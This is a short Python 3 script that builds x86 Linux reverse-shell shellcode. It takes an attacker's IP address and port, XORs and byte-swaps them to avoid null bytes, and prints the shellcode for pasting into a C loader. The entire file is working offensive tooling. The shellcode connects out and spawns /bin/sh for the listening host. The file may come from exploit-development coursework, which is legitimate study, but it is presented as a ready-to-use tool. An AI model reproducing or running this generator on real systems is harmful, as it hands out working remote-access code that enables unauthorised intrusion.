#!/usr/bin/env python3 
# filename: wrapper.py
# reverse shell wrapper in python3 
# usage: python3 wrapper.py 192.168.1.1 5000

# this is a python shellcode wrapper for a C-based reverse shell
# run this, and copy the output shellcode, using it to replace 
# the shellcode in shellcode.c

import argparse
import socket 
from struct import unpack

# grab command line args (ip and port) 
parser = argparse.ArgumentParser() 
parser.add_argument("ip")
parser.add_argument("port")
args = parser.parse_args() 
# check port is in a valid range, we want to be safe
if ((int(args.port) > 65535) or (int(args.port) < 256)):
    print("\nPort number must be between 256 and 65535\n")
    exit()

# xor function 
def xor_strings(str1,str2):
    result =  int(str1,16) ^ int(str2,16)
    return '{:x}'.format(result)

# process the ip address
print("\nIP address: "+ args.ip)
# then convert ip to hex 
hexip = socket.inet_aton(args.ip).hex() 
print("Hex IP Address: "+hexip)
# reverse the hex string 
revhexip = hexip[6:8]
revhexip = revhexip + hexip[4:6]
revhexip = revhexip + hexip[2:4]
revhexip = revhexip + hexip[0:2]
# xor the reversed hex address as the shellcode XORs this address to avoid null bytes 
xored_ip = xor_strings(revhexip,"FFFFFFFF")
print("XORed reverse hex IP Address: "+ xored_ip) 

# process port
print("\nPort: "+args.port)
# then convert port to hex 
hexport = hex(int(args.port)).replace('0x','')
if len(hexport)<4:
    hexport = '0'+hexport
print("Hex Port: "+hexport)
revhexport = hexport[2:4]+ hexport[0:2] 
print("Reverse Hex Port: "+revhexport)

# check for null bytes 
if (xored_ip[0:2]=="00" or 
    xored_ip[2:4]=="00" or 
    xored_ip[4:6]=="00" or 
    xored_ip[6:8]=="00" or 
    revhexport[0:2]=="00" or 
    revhexport[2:4]=="00"):
    print("\n** WARNING ** Null Bytes detected in Xored IP or port shellcode,")
    print("shellcode may not work !\n")

# construct the actual shellcode 
shellcode= \
"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\x31\\xff\\xbf" + \
    "\\x"+ xored_ip[6:8] + \
    "\\x"+ xored_ip[4:6] + \
    "\\x"+ xored_ip[2:4] + \
    "\\x"+ xored_ip[0:2] + \
"\\x83\\xf7\\xff\\x57\\x66\\x68" + \
    "\\x"+ revhexport[2:4] + \
    "\\x"+ revhexport[0:2] + \
"\\x66\\x6a\\x02\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x96\\x66" + \
"\\xb8\\x6a\\x01\\x89\\xf3\\x89\\xe1\\xb2\\x10\\xcd\\x80\\x31\\xc0\\x89\\xf3" + \
"\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\xb0\\x0b" + \
"\\x31\\xdb\\x53\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3" + \
"\\x31\\xc9\\x31\\xd2\\xcd\\x80"

# finally output shellcode 
print("\n"+shellcode+"\n")